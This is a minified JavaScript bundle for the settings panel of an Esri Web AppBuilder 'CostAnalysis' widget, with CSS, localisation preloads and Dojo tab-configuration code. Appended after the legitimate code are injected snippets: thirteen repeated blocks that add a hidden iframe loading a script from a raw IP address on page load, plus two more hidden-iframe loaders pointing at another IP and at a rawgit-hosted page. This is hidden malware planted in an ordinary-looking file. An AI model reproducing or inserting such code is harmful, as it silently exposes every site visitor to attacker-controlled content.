"url:widgets/CostAnalysis/setting/css/style.css":".jimu-widget-cost-analysis-general-settings .esriCTFieldContainer {float: left; padding: 0px 0px 20px 0px;}.jimu-widget-cost-analysis-general-settings .esriCTDropDownContainer {width: 75%; float: right;}.jimu-widget-cost-analysis-general-settings .esriCTGeneralSettingsLabel {width: 25%; float: left; padding-right: 5px;}.jimu-widget-cost-analysis-general-settings .esriCTProjectOutputSettingsFieldset {margin: 20px 0px 0px 0px; border: 1px solid #D2DAE2;}.jimu-widget-cost-analysis-general-settings .esriCTProjectOutputSettingsLegend {margin-left: 10px; font-weight: bold;}.jimu-widget-cost-analysis-general-settings .esriCTProjectFieldContainer {float: left;}.jimu-widget-cost-analysis-general-settings .esriCTBufferDistanceLabel {float: right; width: 100%; text-align: center; padding-left: 5px; max-width: 214px;}.jimu-widget-cost-analysis-general-settings .esriCTVerticalCenterAlignLabel {line-height: 30px;}.jimu-widget-cost-analysis-general-settings .esriCTProjectSettingsContainer {overflow: hidden; padding: 15px;}.jimu-widget-cost-analysis-general-settings .esriCTProjectAreaTypeContainer {float: left; width: 48%; max-width: 214px; padding-right: 5px;}.jimu-widget-cost-analysis-general-settings .esriCTProjectAreaTypeInputContainer {width: 52%; float: left;}.jimu-widget-cost-analysis-general-settings .esriCTBufferDistanceLabelContainer {float: left; width: 50%; padding-right: 5px;}.jimu-widget-cost-analysis-general-settings .esriCTBufferDistanceInputContainer {float: left; width: 20%;}.jimu-widget-cost-analysis-general-settings .esriCTProjectMeasurementUnitContainer {width: 30%; float: left; padding-left: 5px;}.jimu-widget-cost-analysis-general-settings .esriCTProjectSettingsOutputRightContainer {float: right; width: 50%}.jimu-widget-cost-analysis-general-settings .esriCTProjectSettingsOutputLeftContainer {float: left; width: 50%;}.jimu-widget-cost-analysis-general-settings .esriCTBufferDistanceUnit {max-width: 130px;}.esriRtl .jimu-widget-cost-analysis-settings .esriCTTabNode {padding-left: 20px;}.esriRtl .jimu-widget-cost-analysis-general-settings .esriCTFieldContainer {float: right; padding: 0px 0px 20px 0px;}.esriRtl .jimu-widget-cost-analysis-general-settings .esriCTTabNode {padding-left: 20px; padding-right: 0px;}.esriRtl .jimu-widget-cost-analysis-general-settings .esriCTGeneralSettingsLabel {float: right; padding-right: 0px; padding-left: 5px;}.esriRtl .jimu-widget-cost-analysis-general-settings .esriCTProjectSettingsOutputLeftContainer {float: right;}.esriRtl .jimu-widget-cost-analysis-general-settings .esriCTProjectSettingsOutputRightContainer {float: left;}.esriRtl .jimu-widget-cost-analysis-general-settings .esriCTProjectAreaTypeContainer {float: right; padding-right: 0px; padding-left: 5px;}.esriRtl .jimu-widget-cost-analysis-general-settings .esriCTBufferDistanceLabelContainer {float: right; padding-right: 0px; padding-left: 5px; text-align: center;}.esriRtl .jimu-widget-cost-analysis-general-settings .esriCTBufferDistanceInputContainer {float: right;}.esriRtl .jimu-widget-cost-analysis-general-settings .esriCTProjectMeasurementUnitContainer {float: right; padding-left: 0px; padding-right: 5px;}.esriRtl .jimu-widget-cost-analysis-general-settings .esriCTProjectOutputSettingsLegend {margin-left: 0px; margin-right: 10px;}.esriRtl .jimu-widget-cost-analysis-general-settings .esriCTBufferDistanceLabel {padding-right: 5px; padding-left: 0px;}.jimu-widget-cost-analysis-project-settings {width: 100%; float: left;}.jimu-widget-cost-analysis-project-settings .esriCTFieldSet {height: auto; width: 100%; margin-bottom: 10px; padding: 20px 20px 0 20px; border: 1px solid #D2DAE2;}.jimu-widget-cost-analysis-project-settings .esriCTFieldSetLegend {font-weight: bold;}.jimu-widget-cost-analysis-project-settings .esriCTNote {padding-bottom: 20px; font-size: 12px; color: #a0acbf; font-style: oblique;}.jimu-widget-cost-analysis-project-settings .esriCTHelpIcon {height: 30px; width: 20px; background-repeat: no-repeat; background-position: center center; background-image: url(images/help.png); display: inline-block; vertical-align: top; margin: 0 5px; cursor: pointer;}.jimu-widget-cost-analysis-project-settings .esriCTRowContainer {margin-bottom: 20px; float: left;}.jimu-widget-cost-analysis-project-settings .esriCTLabelContainer {width: 30%; float: left; line-height: 30px; padding: 0 10px 0 0;}.jimu-widget-cost-analysis-project-settings .esriCTDropDownContainer {width: calc( 70% - 30px); float: left; box-sizing: border-box;}.jimu-widget-cost-analysis-project-settings .esriCTConfigureFieldsContainer {width: 35%; float: left; padding: 0 10px;}.jimu-widget-cost-analysis-project-settings .esriCTConfigureFieldsLabel {width: calc(100% - 36px); line-height: 30px; text-align: right; padding: 0 0 0 10px; float: right;}.jimu-widget-cost-analysis-project-settings .esriCTConfigureFieldsCheckBox {margin: 5px 10px; float: right;}.jimu-widget-cost-analysis-project-settings .esriCTConfiguredFieldsTable {width: 70%; float: right; margin-bottom: 20px;}.claro .jimu-widget-cost-analysis-project-settings .esriCTConfiguredFieldsTable .dijitSelect {height: 27px; margin-top: 1px; width: 99%; float: left;}.jimu-widget-cost-analysis-project-settings .esriCTProjectSettingsFieldsDropdown .dijitSelectLabel {text-align: left; overflow: hidden; width: 280px; float: left;}.claro .jimu-widget-cost-analysis-project-settings .dijitSelect .dijitInputField {overflow: hidden;}.jimu-widget-cost-analysis-project-settings .esriCTProjectLayerDropdown .dijitSelectLabel {text-align: left;}.esriRtl .jimu-widget-cost-analysis-project-settings .esriCTLabelContainer {float: right; padding: 0 0 0 10px;}.esriRtl .jimu-widget-cost-analysis-project-settings .esriCTDropDownContainer {float: right;}.esriRtl .jimu-widget-cost-analysis-project-settings .esriCTConfigureFieldsContainer {float: left;}.esriRtl .jimu-widget-cost-analysis-project-settings .esriCTConfigureFieldsCheckBox {float: left;}.esriRtl .jimu-widget-cost-analysis-project-settings .esriCTConfigureFieldsLabel {float: left; padding: 0 10px 0 0; text-align: left;}.esriRtl .jimu-widget-cost-analysis-project-settings .esriCTConfiguredFieldsTable {float: left;}.esriRtl .jimu-widget-cost-analysis-project-settings .esriCTProjectLayerDropdown .dijitSelectLabel, .esriRtl .jimu-widget-cost-analysis-project-settings .esriCTProjectSettingsFieldsDropdown .dijitSelectLabel {text-align: right;}.claro .jimu-widget-cost-analysis-layer-settings .esriCTLayerSettingsTableNode .dijitSelect {width: 99%; height: 27px; float: left;}.jimu-widget-cost-analysis-layer-settings .esriCTLayerSettingsFieldsDropdown .dijitSelectLabel {text-align: left; overflow: hidden; width: 213px;}.jimu-widget-cost-analysis-layer-settings .esriCTNoAssetLayersAvailable {color: red; font-style: italic; margin: 0 10px;}.jimu-widget-cost-analysis-layer-settings .esriCTDropDownContainer {float: left;}.esriRtl .claro .jimu-widget-cost-analysis-layer-settings .esriCTLayerSettingsTableNode .dijitSelect {float: right;}.esriRtl .jimu-widget-cost-analysis-layer-settings .esriCTLayerSettingsFieldsDropdown .dijitSelectLabel {text-align: right;}.jimu-widget-cost-analysis-costing-info .esriCTLayerLabel {padding-left: 0px; float: left; text-align: center; vertical-align: middle; padding-right: 10px; max-width: 60%;}.jimu-widget-cost-analysis-costing-info .esriCTBtnAddSection {display: inline-block; overflow: hidden; height: 20px; cursor: pointer; font-size: 13px; color: #538ec8;}.jimu-widget-cost-analysis-costing-info .esriCTBtnAddIcon {height: 100%; width: 14px; background-repeat: no-repeat; background-position: center center; background-image: url(images/add.png); display: inline-block; vertical-align: top;}.jimu-widget-cost-analysis-costing-info .esriCTBtnAddLabel {line-height: 20px;}.jimu-widget-cost-analysis-costing-info .esriCTTabContainer {width: 100%; float: left; margin-bottom: 20px;}.jimu-widget-cost-analysis-costing-info .esriCTMangeScenarios {float: right;}.jimu-widget-cost-analysis-costing-info .esriCTLayerNameContainer {float: left; width: 100%;}.jimu-widget-cost-analysis-costing-info .esriCTManageScenarioButtonContainer {float: right; width: 50%;}.jimu-widget-cost-analysis-costing-info .esriCTLayerTableWrapper {padding-bottom: 20px;}.claro .jimu-widget-cost-analysis-costing-info .esriCTAddLayerTableNode .dijitSelect {width: 100%; height: 28px; float: left;}.claro .jimu-widget-cost-analysis-costing-info .esriCTAddLayerTableNode .dijitTextBox .dijitInputInner {height: 20px; float: left;}.claro .jimu-widget-cost-analysis-costing-info .esriCTAddLayerTableNode .dijitTextBox {height: 26px; float: left;}.jimu-widget-cost-analysis-costing-info .esriCTHelpIcon {height: 36px; width: 20px; background-repeat: no-repeat; background-position: center center; background-image: url(images/help.png); display: inline-block; vertical-align: top; position: absolute; right: 5px;}.jimu-widget-cost-analysis-costing-info .esriCTDropDownContainer {float: left;}.jimu-widget-cost-analysis-edit-equation .esriCTFieldContainer {overflow: hidden; padding: 0px 0px 5px 0px;}.jimu-widget-cost-analysis-edit-equation .esriCTEditCostEquationLabel {width: 40%; float: left; padding-right: 5px;}.jimu-widget-cost-analysis-edit-equation .esriCTVerticalCenterAlignLabel {line-height: 30px;}.jimu-widget-cost-analysis-edit-equation .esriCTCostEquationFieldContainer {width: 60%; float: right;}.jimu-widget-cost-analysis-edit-equation .esriCTFullWidth {width: 100%;}.jimu-widget-cost-analysis-edit-equation .esriCTCostEquationInput {height: 70px !important;}.jimu-widget-cost-analysis-edit-equation .esriCTCostEquationError {border-color: red !important;}.jimu-widget-cost-analysis-edit-equation .esriCTHint {margin: 5px 5px 10px 0px; float: right; font-size: 12px; color: #a0acbf; font-style: oblique;}.jimu-widget-cost-analysis-costing-info .esriCTCostingTemplateFeatureTemplate .dijitSelectLabel {text-align: left; overflow: hidden; width: 140px;}.jimu-widget-cost-analysis-costing-info .esriCTCostingTemplateGeography .dijitSelectLabel {text-align: left; overflow: hidden; width: 140px;}.jimu-widget-cost-analysis-costing-info .esriCTCostingInfoScenarioOptions .dijitSelectLabel {text-align: left; overflow: hidden; width: 140px;}.claro .jimu-widget-cost-analysis-costing-info .esriCTAddLayerTableNode .dijitSelect {width: 99%;}.jimu-widget-cost-analysis-costing-info .jimu-icon-copy {background-image: url(images/copy.png); background-repeat: no-repeat; background-position: center center; width: 16px; height: 16px; padding-left: 10px; padding-right: 10px;}.jimu-widget-cost-analysis-manage-scenarios .title-label, .jimu-widget-cost-analysis-edit-equation .title-label {width: calc(100% - 30px); overflow: hidden; text-overflow: ellipsis; white-space: nowrap;}.jimu-widget-cost-analysis-manage-scenarios .esriCTMainConfigurationContainer {width: 100%; height: 100%; color: #596679; font-size: 14px; overflow: hidden;}.jimu-widget-cost-analysis-manage-scenarios .esriCTPopupFields {width: 28%; float: left; line-height: 30px; padding-right: 5px;}.jimu-widget-cost-analysis-manage-scenarios .esriCTAddScenarioNameTable {margin-top: 10px;}.jimu-widget-cost-analysis-manage-scenarios .jimu-simple-table {max-height: 240px !important;}.jimu-widget-cost-analysis-costing-info .esriCTNoEditableLayersAvailable {color: red; font-style: italic; margin: 0 10px;}.jimu-widget-cost-analysis-costing-info .esriCTAddLayerTableNode .jimu-simple-table .simple-table-field {position: relative; padding-right: 25px;}.esriRtl .jimu-widget-cost-analysis-costing-info .esriCTLayerNameContainer {float: right;}.esriRtl .jimu-widget-cost-analysis-costing-info .esriCTMangeScenarios {float: left;}.esriRtl .jimu-widget-cost-analysis-costing-info .esriCTLayerLabel {padding-right: 0px; float: right; padding-left: 10px;}.esriRtl .jimu-widget-cost-analysis-manage-scenarios .esriCTPopupFields {float: right; padding-right: 0px; padding-left: 5px;}.esriRtl .jimu-widget-cost-analysis-edit-equation .esriCTEditCostEquationLabel {float: right; padding-left: 5px; padding-right: 0px;}.esriRtl .jimu-widget-cost-analysis-edit-equation .esriCTCostEquationFieldContainer {float: left;}.esriRtl .jimu-widget-cost-analysis-costing-template .esriCTCancelDialogPopup {float: left;}.esriRtl .jimu-widget-cost-analysis-costing-info .esriCTCostingTemplateFeatureTemplate .dijitSelectLabel {text-align: right;}.esriRtl .jimu-widget-cost-analysis-costing-info .esriCTCostingTemplateGeography .dijitSelectLabel {text-align: right;}.esriRtl .jimu-widget-cost-analysis-costing-info .esriCTCostingInfoScenarioOptions .dijitSelectLabel {text-align: right;}.esriRtl .jimu-widget-cost-analysis-costing-info .esriCTHelpIcon {right: auto; left: 5px;}.esriRtl .jimu-widget-cost-analysis-costing-info .esriCTManageScenarioButtonContainer {float: left;}.jimu-widget-cost-analysis-statistics-settings .esriCTBtnStatisticsAddSection {display: inline-block; overflow: hidden; height: 20px; cursor: pointer; font-size: 13px; color: #538ec8;}.jimu-widget-cost-analysis-statistics-settings .esriCTHidden {display: none;}.jimu-widget-cost-analysis-statistics-settings .esriCTNoEditableLayersAvailable {color: red; font-style: italic; margin: 0 10px;}.jimu-widget-cost-analysis-statistics-settings .esriCTBtnAddStatisticsIcon {height: 100%; width: 14px; background-repeat: no-repeat; background-position: center center; background-image: url(images/add.png); display: inline-block; vertical-align: top;}.jimu-widget-cost-analysis-statistics-settings .esriCTBtnStatisticsAddLabel {line-height: 20px;}.jimu-widget-cost-analysis-statistics-settings .esriCTTabContainer {width: 100%; float: left; margin-bottom: 20px;}.jimu-widget-cost-analysis-statistics-settings .esriCTLayerLabelTextBox {width: 100%; height: 29px; float: left;}.jimu-widget-cost-analysis-statistics-settings .esriCTStatisticsContainer {float: left; width: 40%;}.jimu-widget-cost-analysis-statistics-settings .esriCTDropDownContainer {width: 75%; float: right;}.jimu-widget-cost-analysis-statistics-settings .esriCTLayerNameDropdown .dijitSelectLabel {text-align: left; overflow: hidden; width: 213px;}.jimu-widget-cost-analysis-statistics-settings .esriCTStatisticsTypeDropdown .dijitSelectLabel {text-align: left; overflow: hidden; width: 104px;}.jimu-widget-cost-analysis-statistics-settings .esriCTStatisticsFieldDropdown .dijitSelectLabel {text-align: left; overflow: hidden; width: 140px;}.claro .jimu-widget-cost-analysis-statistics-settings .esriCTAddLayerTableNode .dijitSelect {height: 28px; min-width: 100%; float: left;}.esriRtl .jimu-widget-cost-analysis-statistics-settings .esriCTStatisticsContainer {float: right;}.esriRtl .claro .jimu-widget-cost-analysis-statistics-settings .esriCTAddLayerTableNode .dijitSelect {height: 28px; min-width: 100%;}.esriRtl .jimu-widget-cost-analysis-statistics-settings .esriCTLayerNameDropdown .dijitSelectLabel {text-align: right; width: 201px;}.esriRtl .jimu-widget-cost-analysis-statistics-settings .esriCTStatisticsTypeDropdown .dijitSelectLabel {text-align: right; width: 96px;}.esriRtl .jimu-widget-cost-analysis-statistics-settings .esriCTStatisticsFieldDropdown .dijitSelectLabel {text-align: right; width: 131px;}.jimu-widget-cost-analysis-settings .jimu-tab3 {height: 100%; overflow: hidden;}.jimu-widget-cost-analysis-settings .jimu-viewstack {height: calc(100% - 45px); overflow: auto;}.jimu-widget-cost-analysis-settings .esriCTTabNode {padding-right: 20px; margin-top: 20px; height: calc(100% - 20px);}.jimu-widget-cost-analysis-settings .esriCTFullWidth {width: 100%;}.jimu-widget-cost-analysis-settings .esriCTFullHeight {height: 100%;}.jimu-widget-cost-analysis-settings .esriCTEllipsis, .jimu-widget-cost-analysis-manage-scenarios .esriCTEllipsis {overflow: hidden; text-overflow: ellipsis; white-space: nowrap;}.jimu-widget-cost-analysis-settings .esriCTMainConfigurationContainer {width: 100%; height: 100%; color: #596679; font-size: 14px;}.jimu-widget-cost-analysis-settings .esriCTHidden {display: none;}.jimu-widget-cost-analysis-costing-template .esriCTCancelDialogPopup {width: 13px; height: 12px; padding-right: 5px; text-align: right; cursor: pointer; float: right; background-repeat: no-repeat; background-position: center center; background-image: url(images/close.png);}.jimu-widget-cost-analysis-costing-template .esriCTDialogText {padding: 5px;}.jimu-btn {line-height: 30px !important;}input[type\x3dtext]::-ms-clear {display: none;}",
"*now":function(t){t(['dojo/i18n!*preload*widgets/CostAnalysis/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare jimu/BaseWidgetSetting dojo/Evented jimu/dijit/TabContainer3 ./GeneralSettings ./ProjectSettings ./LayerSettings ./CostingInfo ./StatisticsSettings dojo/_base/lang dojo/on jimu/dijit/Message jimu/LayerInfos/LayerInfos ../utils".split(" "),function(t,r,u,p,g,l,k,a,d,b,q,m,f,n){return t([r,u],{baseClass:"jimu-widget-cost-analysis-settings",_configurationTabParentContainer:null,_generalSettingsTab:null,_projectSettingsTab:null,_layerSettingsTab:null,_costingInfoTab:null,_statisticsSettingsTab:null,
_layerInfosObj:null,postMixInProperties:function(){this.nls.units={feet:{label:window.jimuNls.units.feet,abbreviation:window.jimuNls.units.feetAbbr},meters:{label:window.jimuNls.units.meters,abbreviation:window.jimuNls.units.metersAbbr},miles:{label:window.jimuNls.units.miles,abbreviation:window.jimuNls.units.milesAbbr},yards:{label:window.jimuNls.units.yards,abbreviation:window.jimuNls.units.yardsAbbr},kilometers:{label:window.jimuNls.units.kilometers,abbreviation:window.jimuNls.units.kilometersAbbr}}},
postCreate:function(){f.getInstance(this.map,this.map.webMapResponse.itemInfo).then(b.hitch(this,function(a){this._layerInfosObj=a}));this._initConfiguration();this.setConfig(this.config)},setConfig:function(){this._layerSettingsTab.setConfig()},getConfig:function(){var a;a=this._generalSettingsTab.validate();if(a.isValid)this.config.generalSettings=this._generalSettingsTab.getConfig();else return this._showMessage(a.errorMessage),n.switchToTab(this._configurationTabParentContainer,this.nls.generalSettings.tabTitle),
!1;a=this._projectSettingsTab.validate();if(a.isValid)this.config.projectSettings=this._projectSettingsTab.getConfig();else return this._showMessage(a.errorMessage),n.switchToTab(this._configurationTabParentContainer,this.nls.projectSettings.tabTitle),!1;this.config.layerSettings=this._layerSettingsTab.getConfig();a=this._costingInfoTab.validate();if(a.isValid)this.config.costingInfoSettings=this._costingInfoTab.getConfig().costingInfoData,this.config.scenarios=this._costingInfoTab.getConfig().scenarios;
else return this._showMessage(a.errorMessage),n.switchToTab(this._configurationTabParentContainer,this.nls.costingInfo.tabTitle),!1;this.config.statisticsSettings=this._statisticsSettingsTab.getConfig();return this.config},_initConfiguration:function(){this._initTabs();this._initGeneralSettings();this._initProjectSettings();this._initLayerSettings();this._initCostingInfo();this._initStatisticsSettings()},_initTabs:function(){this._configurationTabParentContainer=new p({tabs:[{title:this.nls.generalSettings.tabTitle,
content:this.generalSettingsNode},{title:this.nls.projectSettings.tabTitle,content:this.projectSettingsNode},{title:this.nls.layerSettings.tabTitle,content:this.layerSettingsNode},{title:this.nls.costingInfo.tabTitle,content:this.costingInfoNode},{title:this.nls.statisticsSettings.tabTitle,content:this.statisticsSettingsNode}]},this.configurationTabParentContainer);this.own(q(this._configurationTabParentContainer,"tabChanged",b.hitch(this,function(){this._configurationTabParentContainer.containerNode.scrollTop=
0})));this._configurationTabParentContainer.startup()},_initGeneralSettings:function(){this._generalSettingsTab=new g({nls:this.nls,map:this.map,config:this.config});this._generalSettingsTab.placeAt(this.generalSettingsNode)},_initProjectSettings:function(){this._projectSettingsTab=new l({nls:this.nls,map:this.map,config:this.config.projectSettings,layerInfosObj:this._layerInfosObj,appUtils:n});this._projectSettingsTab.placeAt(this.projectSettingsNode);this._projectSettingsTab.on("onLayerSelected",
b.hitch(this,function(a){this._layerSettingsTab&&(this._layerSettingsTab.updateLayerSettingsTable(a),this._costingInfoTab._updateCostingInfoTable(a),this._statisticsSettingsTab._updateStatisticsTable(a))}));this._projectSettingsTab.on("onDuplicateLayerSelect",b.hitch(this,function(a){this._showMessage(a)}));this._projectSettingsTab.on("onGeographyFieldChange",b.hitch(this,function(a,d){if(this._costingInfoTab)if(d&&""!==d)this._costingInfoTab.getGeographyOptions(a,d).then(b.hitch(this,function(a){this._costingInfoTab.onGeographyFieldUpdate(a)}));
else this._costingInfoTab.onGeographyFieldUpdate([{label:this.nls.costingInfo.noneValue,value:""}])}))},_initLayerSettings:function(){this._layerSettingsTab=new k({nls:this.nls,map:this.map,config:this.config,layerInfosObj:this._layerInfosObj});this._layerSettingsTab.placeAt(this.layerSettingsNode);q(this._layerSettingsTab,"onLayerSettingUpdate",b.hitch(this,function(a){this._costingInfoTab._updateCostingInfoTable(a);this._statisticsSettingsTab._updateStatisticsTable(a)}))},_initCostingInfo:function(){this._costingInfoTab=
new a({nls:this.nls,map:this.map,config:this.config,layerInfosObj:this._layerInfosObj});this._costingInfoTab.placeAt(this.costingInfoNode)},_initStatisticsSettings:function(){this._statisticsSettingsTab=new d({nls:this.nls,map:this.map,config:this.config,layerInfosObj:this._layerInfosObj,showActionButtonsInColumn:!0,showActionButtonsInRow:!1});this._statisticsSettingsTab.placeAt(this.statisticsSettingsNode)},_showMessage:function(a){(new m({message:a})).message=a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});